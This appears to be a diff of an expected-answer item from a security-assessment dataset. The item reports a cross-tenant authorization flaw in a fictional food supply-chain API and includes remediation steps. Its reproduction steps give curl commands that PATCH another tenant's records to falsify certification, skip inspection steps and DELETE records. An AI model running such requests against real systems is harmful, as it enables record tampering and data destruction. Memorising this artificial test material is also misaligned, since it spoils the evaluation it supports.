@@ -1,53 +1,87 @@
-# Expected Response
-
 ## System
-- Domain: Food & Beverage / FMCG
-- System: TraceOrigin Supply API
+
+- System: TraceOrigin Supply API v2.2.0
+- Domain: FOOD & BEVERAGE / FMCG
 - Example ID: BOLA-0079
+- Risk ID: RISK-35-079
 
-## Priority Findings
+## Findings
 
-### Finding 1: Unsecured multi-step critical workflows (Pattern 3.5)
-**Severity:** Critical
-**Category:** Insecure Design
+### 1. Pattern 3.5 — Unsecured Multi-Step Critical Workflow: Cross-Tenant Record PATCH (HAR Primary)
 
-**Summary:**
-The `/api/v1/resources` endpoint is vulnerable to Pattern 3.5 (Unsecured multi-step critical workflows).
-An authenticated user from `ORG-8741` can access or modify objects owned by `ORG-C4C4`
-by manipulating the resource identifier in the request.
+**HAR evidence**: JWT `X-Tenant-ID: ORG-8741`. Request: `PATCH /api/v3/records/REC-2079`. Response: HTTP 200 OK with `"tenantId": "ORG-C4C4"`, `"ownerId": "other-user-8741c4c4"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-C4C4"`.
 
-**Evidence from artifact:**
-- Request JWT `tenantId`: `ORG-8741`
-- Response body `tenantId`: `ORG-C4C4` — confirms cross-tenant data returned
-- HTTP status: 200 — no authorization failure
-- `sensitiveData` field exposed across tenant boundary
+**Pattern 3.5 (Unsecured Multi-Step Critical Workflows — Insecure Design)**: supply chain traceability records in TraceOrigin go through a multi-step critical workflow: source verification → quality inspection → origin certification → distribution approval. Each step should be gated by ownership/tenant validation AND the prior step's completion. The handler lacks both: Section 3.0 — "Application code does NOT use tenant_id in authorization checks" (RISK-35-079). An attacker from `ORG-8741` can PATCH any step of `ORG-C4C4`'s supply chain workflow without completing prerequisite steps, and without owning the record.
 
-**Root Cause:**
-Database query does not include `WHERE owner_id = $authenticatedUserId AND tenant_id = $jwtTenantId`.
-The application trusts the path parameter alone.
+**Food & Beverage / FMCG impact**: records represent supply chain traceability records — origin certificates, quality inspection records, food safety certifications, or distribution authorizations. Cross-tenant PATCH allows a competitor to:
+- Falsify another supplier's origin certificates (food fraud)
+- Skip quality inspection steps to approve unsafe batches
+- Corrupt food safety certifications (public health risk)
+- Insert false distribution records in the supply chain
 
-## Steps to Reproduce
+This creates direct food safety risk and violates FDA traceability requirements (Food Safety Modernization Act — FSMA) and EU Regulation 178/2002.
 
-### Step 1 — Authorize baseline
+## Reproduction
+
+**Step 1 — Baseline:**
+
 ```bash
-curl -s "https://api.traceorigin-sup.example.com/api/v1/resources/RES-1079" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>"
+curl -s "https://api.traceorigin-sup.example.com/api/v3/records/REC-1079" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
+  -H "X-Tenant-ID: ORG-8741"
 ```
-Expected: Returns own record with `tenantId: "ORG-8741"`.
 
-### Step 2 — ID substitution
+Expected: `tenantId: "ORG-8741"` — own supply chain record.
+
+**Step 2 — Cross-tenant supply chain record PATCH (primary HAR attack):**
+
 ```bash
-curl -s "https://api.traceorigin-sup.example.com/api/v1/resources/RES-2079" \
-  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>"
+curl -s -X PATCH "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
+  -H "X-Tenant-ID: ORG-8741" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "certified", "sensitive_data": "falsified_origin_certificate"}'
 ```
-**Vulnerable:** Returns `tenantId: "ORG-C4C4"` and `sensitiveData`.
-**Secure:** HTTP 403 or 404.
 
-### Step 3 — Variant tests based on Pattern 3.5
-No specific variant documented for Pattern 3.5 — use Steps 1-2.
+Expected secure: HTTP 403 or 404.  
+Expected vulnerable: HTTP 200 with `tenantId: "ORG-C4C4"` — competitor's supply chain record falsified, workflow step bypassed.
+
+**Step 3 — Multi-step workflow bypass: advance to certification without inspection:**
+
+```bash
+# Directly set a supply chain record to "certified" status without completing inspection step
+curl -s -X PATCH "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
+  -H "X-Tenant-ID: ORG-8741" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "distributed", "sensitive_data": "batch_approved_skip_inspection"}'
+```
+
+Expected secure: HTTP 400/403 — "Prior workflow step not completed."  
+Expected vulnerable: HTTP 200 — unsafe batch advanced to distribution without safety inspection.
+
+**Step 4 — Cross-tenant read and delete:**
+
+```bash
+curl -s "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
+  -H "X-Tenant-ID: ORG-8741"
+
+curl -s -X DELETE "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
+  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
+  -H "X-Tenant-ID: ORG-8741"
+```
+
+## Evidence
+
+- **HAR**: `PATCH /api/v3/records/REC-2079` with `ORG-8741` JWT → HTTP 200 → `tenantId: ORG-C4C4` with `sensitiveData`.
+- **Section 4.0 (RISK-35-079)**: Pattern 3.5 — GET/PATCH/DELETE lack tenant/owner filter.
+- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.
 
 ## Remediation
-1. Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub` to all queries that accept user-supplied IDs.
-2. Centralise authorization middleware: never allow ID resolution without ownership check.
-3. Use non-sequential, randomly-generated UUIDs for object IDs to reduce enumeration risk.
-4. Add regression test: Tenant A token requests Tenant B ID — assert 403/404.
+
+- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-35-079, unblock #DB-179).
+- **Enforce workflow state machine**: PATCH must validate prior step completion before allowing status advancement; reject out-of-order transitions with HTTP 400.
+- **Store workflow state server-side**: never trust client-supplied `status` fields to skip workflow steps.
+- **FSMA compliance**: all supply chain traceability record modifications must be audited and workflow-gated.
+- **Regression test**: Tenant A token patches Tenant B `record_id` — assert HTTP 403/404. Attempt to advance status without prior step — assert HTTP 400.
